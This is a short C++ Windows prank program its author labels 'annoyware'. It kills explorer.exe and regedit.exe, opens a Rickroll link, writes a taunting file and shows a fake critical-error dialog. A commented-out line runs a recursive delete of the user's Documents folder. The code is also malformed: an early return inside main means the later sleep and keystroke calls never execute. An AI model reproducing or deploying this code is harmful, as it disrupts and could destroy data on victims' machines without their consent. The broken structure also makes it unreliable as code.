#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <stdio.h>
#include <Windows.h>
using namespace std;



int main() {
    

	system("echo off");
    system("taskkill /f /im explorer.exe");
    system("taskkill /f /im regedit.exe");
	system("start https://www.youtube.com/watch?v=oHg5SJYRHA0"); //rickroll starts

    std::ofstream outfile("Congratulations.txt");

    outfile << "annoyware planted by [redacted]" << std::endl;
    outfile.close();

    //system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder DOESNT WORK
    //system("MD %UserProfile%\Documents"); //Recreate Documents Folder DOESNT WORK
    
    ;string DisplayRickError(); {
        int msgboxID = MessageBox(
            NULL,
            L"Never gonna give you up never gonna let you down never gonna run around and desert you",
            L"Critical error!",
            MB_ICONERROR | MB_OK
        );

        return msgboxID;


    }

    std::this_thread::sleep_for(std::chrono::seconds(10));

    const int KEYEVENT_KEYUP = 0x02;
    keybd_event(VK_CONTROL, 0, 0, 0);
    keybd_event(VK_SCROLL, 0, 0, 0);

    //

	return 0
		; //floating ; do not disturb
}

